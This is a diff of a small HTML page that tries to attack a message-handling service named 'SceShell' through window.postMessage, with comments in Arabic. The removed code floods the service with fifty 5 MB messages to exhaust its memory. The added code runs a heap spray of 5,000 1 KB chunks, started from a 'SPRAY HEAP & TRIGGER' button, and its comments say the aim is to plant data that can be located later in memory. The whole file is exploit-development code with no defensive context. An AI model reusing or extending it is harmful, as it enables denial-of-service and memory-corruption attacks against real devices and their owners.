@@ -1,23 +1,35 @@
 <html>
 <body>
+    
+    
+    
+    
+    
+    
+    
 <script>
-    // بدلاً من إرسال رسالة واحدة، سنرسل "سلسلة" من الطلبات الكبيرة جداً
-    // لإجبار الـ Service على حجز ذاكرة متتالية
-    let bigPayload = "A".repeat(1024 * 1024 * 5); // 5MB لكل طلب
-
-    function triggerOOM() {
-        for (let i = 0; i < 50; i++) {
-            window.postMessage({
-                cmd: 'execute', 
-                target: 'SceShell', 
-                data: bigPayload + i 
-            }, '*');
+    // 1. توليد "قطع" صغيرة من الذاكرة لملء الـ Heap
+    // نحاول زرع بيانات محددة يمكن البحث عنها لاحقاً في الذاكرة
+    let spray = [];
+    function heapSpray() {
+        for (let i = 0; i < 5000; i++) {
+            let chunk = "S".repeat(1024); // 1KB
+            spray.push(chunk);
+            
+            // إرسال رسالة صغيرة مع كل قطعة
+            window.postMessage({id: i, data: chunk}, '*');
         }
     }
-
-    // زر للبدء
-    document.body.innerHTML = '<button onclick="triggerOOM()" style="padding:50px; font-size:30px;">TRIGGER OOM</button>';
+    
+    // زر التنفيذ
+    document.body.innerHTML = '<button onclick="heapSpray()" style="padding:50px;">SPRAY HEAP & TRIGGER</button>';
 </script>
+
+
+
+
+
+
 
 </body>
 </html>
